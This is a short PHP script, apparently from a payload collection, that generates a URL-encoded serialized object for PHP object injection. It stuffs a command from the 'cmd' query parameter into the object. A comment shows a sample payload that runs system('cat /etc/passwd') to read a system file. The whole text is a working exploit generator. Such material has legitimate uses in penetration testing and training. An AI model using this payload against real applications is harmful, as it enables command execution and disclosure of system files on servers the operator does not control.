<?php
class PHPObjectInjection
{
   public $inject;
   public function __construct()
   {
   	$this->inject = $_GET['cmd'];
   }
}

echo urlencode(serialize(new PHPObjectInjection));
// O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system('cat /etc/passwd');";}
?>